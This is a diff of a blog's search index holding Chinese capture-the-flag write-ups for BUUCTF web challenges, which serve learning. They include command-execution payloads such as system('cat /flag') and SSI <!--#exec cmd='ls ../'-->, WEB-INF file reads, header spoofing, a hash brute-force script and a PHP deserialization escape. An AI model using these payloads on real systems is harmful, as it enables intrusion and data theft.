@@ -1,47 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Pwn</title>
-    <url>/CTF/Pwn/index/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
-    <url>/CTF/Web/BUU-Easy_Java/</url>
-    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
-<blockquote>
-<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
-</blockquote>
-<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<p>弱口令，在Bp的Intruder模块下破解密码</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
-<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<blockquote>
-<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
-</blockquote>
-<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
-<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
-<p>下载打开help.docx中并没有flag</p>
-<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
-<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
-<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
-<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU-ZJCTF,不过如此 - Wp</title>
     <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
     <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
@@ -89,6 +48,73 @@
 <p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
 </blockquote>
 <p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[BJDCTF2020]EasySearch的Wp</title>
+    <url>/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/</url>
+    <content><![CDATA[<h4 id="知识点（参考别人的文章）："><a href="#知识点（参考别人的文章）：" class="headerlink" title="知识点（参考别人的文章）："></a>知识点（参考别人的文章）：</h4><ul>
+<li><input disabled type="checkbox"> 1.<a href="https://blog.csdn.net/qq_46145027/article/details/122174063">目录扫描</a></li>
+<li><input disabled type="checkbox"> 2.代码审计</li>
+<li><input disabled type="checkbox"> 3.<a href="https://blog.csdn.net/cnds123/article/details/125962911">shtml</a></li>
+</ul>
+<h4 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1.目录扫描"></a>1.目录扫描</h4><p><code>python dirsearch.py -u &quot;URL&quot; -W ./db/字典名字</code></p>
+<h4 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h4><p><code>header(&quot;Content-Type: text/html;charset=utf-8&quot;);</code></p>
+<p>-&gt; 设置HTTP响应头的一种方式，header函数必须在发送任何实际输出（如HTML内容）之前调用，以确保设置的响应头生效,通常在PHP脚本开头</p>
+<p><code>mt_rand(0,73)</code></p>
+<p>-&gt;使用 Mersenne Twister 算法，在0-73这个范围内随机生成一个整数</p>
+<h4 id="3-shtml"><a href="#3-shtml" class="headerlink" title="3.shtml"></a>3.shtml</h4><p>后缀名是.shtml，和html一样都是网页文件。不同在于：</p>
+<p>-&gt;shtml文件中有<strong>服务器端包含（server-side includes, SSI）指令</strong></p>
+<p>-&gt;shtml文件在发送到客户端前，会经过服务器进行处理 — <strong>将shtml文件中的SSI指令解释</strong></p>
+<p>-&gt;最终返回给客户端的是<strong>解释过后的shtml文件内容</strong></p>
+<p><strong>SSI指令格式</strong></p>
+<p><code>&lt;!--#include virtual=&quot;文件名字&quot;--&gt;</code></p>
+<p><code>&lt;!--#include file=&quot;文件名字&quot;--&gt; </code> </p>
+<p>-&gt;<code>#include</code>在html文件中引入另一个文件的内容</p>
+<p>-&gt; file 是相对于本文档的位置      virtual 是相对于服务器根目录的位置</p>
+<p><code>&lt;!--#echo var=&quot;变量名称&quot;--&gt;</code> </p>
+<p>-&gt;<code>#echo</code>将 变量或代码 插入到页面中</p>
+<p><strong>注意：&lt;!–与#号间无空格，只有SSI指令与参数间存在空格，SSI指令是大小写敏感的。</strong></p>
+<p><strong>注意：服务器必须配置为支持SSI功能。SHTML文件可能需要在服务器上启用SSI才能发挥作用。</strong></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据题目名 EasySearch 选择用dirsearch扫描目录，不过我自己什么都没扫出来，看Wp说是 index.php.swp，需要自己将这个添加到字典中，才可以扫出来</p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/00.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;    </span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>1.get_hash函数</p>
+<p>-&gt;$chars是大小写字母+数字+一些特殊符号，$random是$chars中五个随机字符，$content是一段唯一字符串+$random</p>
+<p>-&gt;返回是经过sha1加密的字符串</p>
+<p>2.if else语句可以发现</p>
+<p>-&gt;如果满足$admin &#x3D;&#x3D; substr(md5($_POST[‘password’]),0,6) 会进入if语句  否则直接输出 [!] Failed</p>
+<p>-&gt;显然要满足 脚本编写（跟Wp写的，自己学习一下）</p>
+<p>3.进入if语句之后，会向$shtml中写入$text的内容</p>
+</blockquote>
+<p>首先要通过脚本找到满足if的条件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+<p>成功进入</p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/01.png"></p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/02.png"></p>
+<p>输出了 [!] Header error …</p>
+<p>我们是向一个文件中写入了内容，并且我们了解到了shtml的知识，很明显，我们要找到这个写入内容的shtml文件的目录，从而访问</p>
+<p>最后在F12网络中可以找到</p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/03.png"></p>
+<p>访问之后</p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/04.png" alt="04"></p>
+<p>得到$username就是我们的执行点 再根据shtml的知识，通过SSI指令来控制内容</p>
+<p><code>&lt;!--#exec cmd=&quot;ls&quot;-&gt;</code></p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/05.png"></p>
+<p>查看当前目录并没有什么收获，但我们当前目录是 public 所以我们查看上一级目录</p>
+<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;-&gt;</code></p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/06.png"></p>
+<p>直接访问</p>
+<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/07.png"></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -162,107 +188,33 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-[MRCTF2020]套娃的Wp</title>
-    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
-    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
-<ul>
-<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
+    <url>/CTF/Web/BUU-Easy_Java/</url>
+    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
 <blockquote>
-<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
-<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
+<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
 </blockquote>
-<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
-<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
-<p>payload1：<code>/?b u p t=23333%0A</code></p>
-<p><strong>访问下一个页面</strong>：</p>
-<ul>
-<li><input disabled type="checkbox"> 编码的特征认识</li>
-</ul>
-<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
-<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
+<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<p>弱口令，在Bp的Intruder模块下破解密码</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
+<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
 <blockquote>
-<p>alert()是js中的弹出函数</p>
+<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
 </blockquote>
-<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
-<p><strong>回显出第三个页面：</strong></p>
-<ul>
-<li><input disabled type="checkbox"> 代码审计</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>
-
-<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>
-
-<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
-<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
-<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-easy_serialize_php的Wp</title>
-    <url>/CTF/Web/BUU-easy_serialize_php/</url>
-    <content><![CDATA[<blockquote>
-<p>1.代码审计</p>
-<p>2.PHP反序列化</p>
-<p>3.反序列化中的对象逃逸</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
-<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
-<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
-</blockquote>
-<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
-<hr>
-<p><strong>如何去构造一个字符串逃逸</strong></p>
-<hr>
-<p><strong>1.键名逃逸</strong></p>
-<p>如何传入$_SESSION[phpflag] 序列化之后</p>
-<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
-<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
-<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>结合起来</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// 